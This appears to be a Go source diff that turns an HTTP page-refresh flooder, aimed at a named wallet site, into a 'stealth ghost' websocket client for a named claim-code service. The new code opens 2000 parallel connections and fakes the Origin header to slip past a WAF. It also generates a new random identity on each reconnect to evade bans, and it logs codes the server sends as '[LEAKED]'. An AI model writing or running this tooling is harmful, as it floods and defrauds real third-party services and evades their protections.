@@ -1,7 +1,7 @@
 package main
 
 import (
-	"io"
+	"encoding/json"
 	"log"
 	"math/rand"
 	"net/http"
@@ -9,33 +9,46 @@ import (
 	"os/signal"
 	"runtime"
 	"runtime/debug"
-	"strconv"
-	"strings"
 	"sync"
 	"syscall"
 	"time"
+
+	"github.com/gorilla/websocket"
 )
 
 // ==========================================
 // CONFIGURATION (STAY STEALTHY)
 // ==========================================
 var (
-	SERVER_URL      = getEnv("TARGET_URL", "https://www.ddwallet.vip/")
-	TOTAL_CLIENTS   = 3000           // Number of concurrent refresh clients
-	MAX_WORKERS     = 3000
-	REFRESH_DELAY   = 80 * time.Millisecond // Lower = heavier stress (80ms ≈ 375 RPS total)
+	SERVER_URL      = getEnv("TARGET_URL", "wss://kingclaimer.xyz:8443/")
+	TOTAL_CLIENTS   = 2000           // Recommended to keep at 1 to avoid Cloudflare flags
+	MAX_WORKERS     = 2000           
+	RECONNECT_DELAY = 3 * time.Second // Slower reconnect to avoid IP bans
 )
 
 // Worker Semaphore to limit max workers
 var workerSemaphore = make(chan struct{}, MAX_WORKERS)
+
+var (
+	printHandshakeOnce sync.Once
+)
 
 func init() {
 	rand.Seed(time.Now().UnixNano())
 }
 
 // ==========================================
-// HELPERS
+// TOKEN + USERNAME GENERATORS
 // ==========================================
+func generateRandomUsername() string {
+	var letters = []rune("abcdefghijklmnopqrstuvwxyz0123456789")
+	b := make([]rune, 8)
+	for i := range b {
+		b[i] = letters[rand.Intn(len(letters))]
+	}
+	return "Ghost_" + string(b)
+}
+
 func getEnv(key, defaultValue string) string {
 	if value, exists := os.LookupEnv(key); exists {
 		return value
@@ -43,73 +56,130 @@ func getEnv(key, defaultValue string) string {
 	return defaultValue
 }
 
-var userAgents = []string{
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
-	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
-	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
-}
-
 // ==========================================
 // CLIENT STRUCT
 // ==========================================
 type StressClient struct {
 	clientID     int
+	username     string
+	ws           *websocket.Conn
+	connected    bool
 	running      bool
 	lastActivity time.Time
 	lock         sync.Mutex
-	httpClient   *http.Client
+	sendChan     chan map[string]interface{} // Added for non-blocking writes
+	doneChan     chan struct{}               // Added to signal disconnects
 }
 
 func NewStressClient(id int) *StressClient {
 	return &StressClient{
 		clientID: id,
-		httpClient: &http.Client{
-			Timeout: 15 * time.Second,
-		},
+		username: "", // Will be generated in Connect()
+		sendChan: make(chan map[string]interface{}, 256),
+		doneChan: make(chan struct{}),
 	}
 }
 
-func (c *StressClient) DoRefresh() {
+func getWAFHeaders() http.Header {
+	headers := http.Header{}
+	headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
+	headers.Add("Origin", "https://stake.com")
+	return headers
+}
+
+func (c *StressClient) Connect() bool {
+	// GENERATE A NEW IDENTITY EVERY TIME IT CONNECTS
+	c.username = generateRandomUsername()
+
+	dialer := websocket.DefaultDialer
+	dialer.HandshakeTimeout = 10 * time.Second
+
+	ws, resp, err := dialer.Dial(SERVER_URL, getWAFHeaders())
+	if err != nil {
+		if resp != nil {
+			log.Printf("[Client %d] Dial failed with status: %d", c.clientID, resp.StatusCode)
+		}
+		return false
+	}
+
+	c.ws = ws
+
+	// Wait for "WELCOME"
+	ws.SetReadDeadline(time.Now().Add(10 * time.Second))
+	_, welcomeMsg, err := ws.ReadMessage()
+	if err != nil {
+		c.Disconnect()
+		return false
+	}
+
+	printHandshakeOnce.Do(func() {
+		log.Printf("\n[+] SERVER WELCOME: %s\n", string(welcomeMsg))
+	})
+
+	// REGISTER WITH THE NEW RANDOM USERNAME
+	regPayload := map[string]string{
+		"type":     "register",
+		"role":     "claimer",
+		"username": c.username,
+	}
+	
+	err = ws.WriteJSON(regPayload)
+	if err != nil {
+		c.Disconnect()
+		return false
+	}
+
+	ws.SetReadDeadline(time.Time{})
+
 	c.lock.Lock()
+	c.connected = true
 	c.lastActivity = time.Now()
+	// Reset channels for a fresh connection
+	c.sendChan = make(chan map[string]interface{}, 256)
+	c.doneChan = make(chan struct{})
 	c.lock.Unlock()
 
-	// Strong cache busting (timestamp + random) so it NEVER hits cache / CDN edge the same way
-	buster := strconv.FormatInt(time.Now().UnixNano(), 10)
-	targetURL := SERVER_URL
-	if strings.Contains(targetURL, "?") {
-		targetURL += "&_=" + buster
-	} else {
-		targetURL += "?_=" + buster
-	}
+	log.Printf("[Client %d] Logged in as: %s", c.clientID, c.username)
+	
+	// Start the non-blocking write pump
+	go c.writePump()
+	
+	return true
+}
 
-	req, err := http.NewRequest("GET", targetURL, nil)
-	if err != nil {
-		log.Printf("[Client %d] NewRequest failed: %v", c.clientID, err)
+func (c *StressClient) Disconnect() {
+	c.lock.Lock()
+	defer c.lock.Unlock()
+	if !c.connected {
 		return
 	}
-
-	// Realistic browser + aggressive no-cache headers
-	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
-	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
-	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
-	req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate, max-age=0")
-	req.Header.Set("Pragma", "no-cache")
-	req.Header.Set("Expires", "0")
-	req.Header.Set("Connection", "keep-alive")
-
-	resp, err := c.httpClient.Do(req)
-	if err != nil {
-		log.Printf("[Client %d] Request error: %v", c.clientID, err)
-		return
+	if c.ws != nil {
+		c.ws.Close()
 	}
-	defer resp.Body.Close()
+	c.connected = false
+	close(c.doneChan) // Signal pumps to stop
+}
 
-	// Consume body (simulates real browser, keeps connection alive for load balancer test)
-	io.Copy(io.Discard, resp.Body)
-
-	log.Printf("[Client %d] Page Refresh -> Status: %d | %s", c.clientID, resp.StatusCode, targetURL)
+// writePump handles all outbound messages non-blockingly
+func (c *StressClient) writePump() {
+	for {
+		select {
+		case msg, ok := <-c.sendChan:
+			if !ok {
+				return // Channel closed
+			}
+			if c.ws != nil {
+				c.ws.SetWriteDeadline(time.Now().Add(10 * time.Second))
+				err := c.ws.WriteJSON(msg)
+				if err != nil {
+					c.Disconnect()
+					return
+				}
+			}
+		case <-c.doneChan:
+			return
+		}
+	}
 }
 
 func (c *StressClient) Run() {
@@ -118,23 +188,75 @@ func (c *StressClient) Run() {
 	defer func() { <-workerSemaphore }()
 
 	for c.running {
-		c.DoRefresh()
-		time.Sleep(REFRESH_DELAY)
+		c.lock.Lock()
+		isConnected := c.connected
+		c.lock.Unlock()
+
+		if !isConnected {
+			if !c.Connect() {
+				time.Sleep(RECONNECT_DELAY)
+				continue
+			}
+		}
+
+		// Read loop
+		for {
+			_, message, err := c.ws.ReadMessage()
+			if err != nil {
+				c.Disconnect()
+				// Enforce a delay before loop restarts to prevent Heroku Crash 137
+				time.Sleep(RECONNECT_DELAY)
+				break
+			}
+
+			c.lock.Lock()
+			c.lastActivity = time.Now()
+			c.lock.Unlock()
+
+			var data map[string]interface{}
+			if err := json.Unmarshal(message, &data); err == nil {
+				if data["type"] == "ping" {
+					// Non-blocking write via channel
+					select {
+					case c.sendChan <- map[string]interface{}{"type": "pong"}:
+					default:
+						log.Printf("[Client %d] Send buffer full, dropping pong", c.clientID)
+					}
+				}
+
+				if code, exists := data["code"]; exists {
+					log.Printf("\n🔥 [LEAKED]: %v 🔥\n", code)
+					
+					// Stop the "ping-pong" match if your other device connects
+					if code == "NEW_DEVICE_CONNECTED" {
+						log.Printf("⚠️ Kicked because the user connected elsewhere. Pausing 10s...")
+						c.Disconnect()
+						time.Sleep(10 * time.Second) // Updated to match log description
+						break
+					}
+				}
+				
+				// Reconnect instead of shutting down if authentication fails
+				if data["message"] == "Authentication failed" {
+					log.Printf("🛑 BANNED/INVALID. Reconnecting...")
+					c.Disconnect()
+					time.Sleep(RECONNECT_DELAY)
+					break
+				}
+			}
+		}
 		runtime.Gosched()
 	}
 }
 
 func main() {
 	log.SetFlags(log.LstdFlags | log.Lmsgprefix)
-	debug.SetMemoryLimit(850 * 1024 * 1024)
+	debug.SetMemoryLimit(850 * 1024 * 1024) 
 	runtime.GOMAXPROCS(runtime.NumCPU())
 
 	log.Println("========================================")
-	log.Println(" KING-CLAIMER HTTP REFRESH STRESS TESTER ")
+	log.Println(" KING-CLAIMER STEALTH GHOST ACTIVE ")
 	log.Printf(" Target: %s", SERVER_URL)
-	log.Printf(" Clients: %d | Workers: %d | Delay: %v", TOTAL_CLIENTS, MAX_WORKERS, REFRESH_DELAY)
-	log.Println(" Mode: Repeated page refresh + full cache bypass")
-	log.Println(" Purpose: Test regional routing + load balancing")
 	log.Println("========================================")
 
 	var wg sync.WaitGroup
@@ -150,7 +272,5 @@ func main() {
 	done := make(chan os.Signal, 1)
 	signal.Notify(done, os.Interrupt, syscall.SIGINT, syscall.SIGTERM)
 	<-done
-
-	log.Println("Shutting down gracefully...")
 	wg.Wait()
 }
